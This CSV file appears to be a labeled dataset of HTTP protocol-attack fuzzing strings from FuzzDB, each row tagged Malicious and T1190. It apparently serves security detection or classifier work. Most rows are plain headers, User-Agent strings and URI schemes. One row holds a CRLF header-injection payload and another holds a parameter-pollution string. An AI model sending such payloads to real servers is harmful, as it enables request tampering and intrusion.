User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
file:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Max-Forwards,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
NOTIFY,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.79 [en] (WinNT; U),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
secondlife:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sftp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&id=1&id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Range,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
query:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0aX-Injection-Header:%20AttackValue,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Server,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ldaps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
